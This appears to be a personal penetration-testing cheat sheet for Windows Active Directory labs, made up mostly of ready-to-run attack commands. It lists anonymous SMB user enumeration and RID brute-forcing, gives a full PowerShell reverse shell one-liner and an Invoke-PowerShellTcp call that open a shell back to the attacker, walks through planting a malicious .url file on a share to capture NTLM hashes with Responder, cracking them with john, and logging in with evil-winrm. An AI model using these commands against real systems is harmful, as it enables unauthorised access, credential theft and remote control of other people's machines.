**when enumerate smb shares and we have read access to ```IPC$``` share, We will be able to list the domain users as ```anonymous``` using different tools:**

1- ```lookupsid.py anonymous@<target ip>```<br>
#OR<br>
```lookupsid.py <username>@<target ip>``` #if we have valid creds <br>

2- ```crackmapexec smb <target ip> -u 'guest' -p '' --rid-brute```

----------------------------------------------------------------------------------------------------------------------

**if we do not know the domain name we could use ```crackmapexec``` to dump some cool information:**
```
crackmapexec smb <target ip>
                                                                  
SMB         10.10.250.17    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```
#OR 
Use ```enum4linux```:
```
enum4linux <target ip>
```
----------------------------------------------------------------------------------------------------------------------

**Powershell reverse shell**

1.
```
$client = New-Object System.Net.Sockets.TCPClient('<OUR ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
2. The ```Invoke-PowerShellTcp.ps1``` script is typically a reverse shell script written in PowerShell
```
Invoke-PowerShellTcp -Reverse -IPAddress  <your ip> -Port 1234
```

----------------------------------------------------------------------------------------------------------------------

transitive object control in bloodhound
---

In BloodHound, "transitive object control" refers to an attack path where an attacker gains indirect control over a sensitive object (such as a user, group, or computer) by exploiting multiple relationships or permissions in Active Directory. This often results from a chain of misconfigurations where control over one object enables control over another, eventually leading to higher privileges, such as Domain Admin.<br>
Transitive control **occurs** when an attacker doesn’t have direct control over a target object but can use their control over another object to eventually gain access to the target.
For example:

    Attacker controls UserA.
    UserA has control over GroupB.
    GroupB contains a privileged user, like a Domain Admin.
    The attacker can then leverage control over UserA to modify GroupB and escalate privileges

----------------------------------------------------------------------------------------------------------------------


If we know there is activity in the share, we can try dropping a file to the share that will **force the user to authenticate to our server** when a user browses the share.


Using ```ntlm_theft.py``` to create a malicious ```.url``` file.
	
```
$ python3 ntlm_theft.py -g url -s 10.11.63.57 -f test
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Generation Complete.
```
Running responder to spin up a server that will respond to the authentication requests made.
	
```
$ sudo responder -I tun0
```
Uploading the generated file to the vuln share.
	
```
smb: \> cd onboarding\
smb: \onboarding\> put "test-(icon).url"
putting file test-(icon).url as \onboarding\test-(icon).url (0.4 kb/s) (average 0.3 kb/s)
```
After some time we get the hash.
<br>
Then we could use john to crack the hash.
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
```

**Using ```evil-winrm``` to get a shell**

Using the credentials we have, we can use ```evil-winrm``` to get a shell.
	
```
$ evil-winrm -i <domain name> -u '<user we got>' -p 'his password'
```





